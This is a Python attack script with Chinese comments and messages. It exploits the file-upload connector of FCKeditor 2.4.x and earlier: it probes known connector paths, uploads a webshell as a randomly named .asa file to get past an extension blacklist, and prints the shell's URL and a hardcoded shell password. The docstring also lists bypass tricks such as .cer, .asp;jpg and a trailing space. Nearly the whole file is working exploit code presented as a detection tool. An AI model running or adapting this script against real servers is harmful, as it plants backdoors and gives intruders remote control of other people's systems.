# -*- coding: utf-8 -*-
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
import string
from random import *
import re
import sys

'''
Usage:
    moon.py -u  fck http://127.0.0.1:8080
    fck <2.4.x版本（也就是2.4.x及以下）的File参数时为黑名单验证，可以通过上传.asa、.cer、.asp;jpg（针对IIS6）。
    如果asa、cer不被解析，还可以传.asp[空格]。传的方法就是抓包然后在数据包里的文件名后填个空格。
    实际测试过程中还是上传asa可以，以下脚本也基于asa上传
    fck编辑器如要上传文件需配置相关项目，如果出现上传成功且获取上传路径失败，就可能是配置不允许上传。
    返回包出现这类文字基本上就是设置不允许上传：This connector is disabled. Please check the
    
'''

def gen_shell():
    min_char = 4
    max_char = 12
    allchar = string.ascii_letters + string.digits
    shell_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return shell_name

def geturl(URL):
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}

    urls = (
        '/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/', #fck25
        '/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/',  #fck243
        '/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/',#fck21,#fck22,fck23
    )
    for url in urls:
        url = URL + url
        try:
            verify_response = requests.get(url, headers=headers)
            html = verify_response.content.decode('utf-8')
            soup = re.search(r'<CurrentFolder path="/" url="(.*?)" />', html)
            print("此Fckeditor上传路径为：" + soup.group(1))
            return soup.group(1)
            break
        except:
            pass

def attack(URL):
    print('[+]开始检测-Fckeditor<=2.4版本简单文件上传。asp[+]')
    url = URL + '/editor/filemanager/browser/default/connectors/test.html'
    user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
    headers = {"User-Agent": user_agent,"Upgrade-Insecure-Requests": "1"}
    verify_response = requests.get(url, headers=headers)
    shellname = gen_shell()
    if verify_response.status_code == 200:
        print('存在有风险的上传页面：'+url)
        try:
            url = URL + '/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/'
            pwd = sys.argv[0]  # 获取当前文件夹的路径
            m = MultipartEncoder(fields={'NewFile': (f'{shellname}.asa', open(f'{pwd}\\..\\fckeditor\\shell.asa', 'rb'), 'application/octet-stream')})
            headers={'Content-Type': m.content_type,
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'
            }
            r = requests.post(url, data=m, headers=headers)
            print('上传shell成功！')
            try:
                aim_url = geturl(URL)
                URL = re.match('http://(.*?)/',URL).group()
                print('Shell地址为：'+URL+ aim_url+shellname+'.asa')
                print('shell密码为：gutf987y97y97。')
            except:
                print('获取上传路径失败，shell名为：'+shellname+'.asa')
                print('shell密码为：gutf987y97y97。')
        except:
            print('上传shell发生错误。')
    else:
        print('未发现该页面：'+url)
    print('[+]检测结束-Fckeditor<=2.4版本简单文件上传。[+]')
    print('\n')


if __name__ == "__main__":
    attack()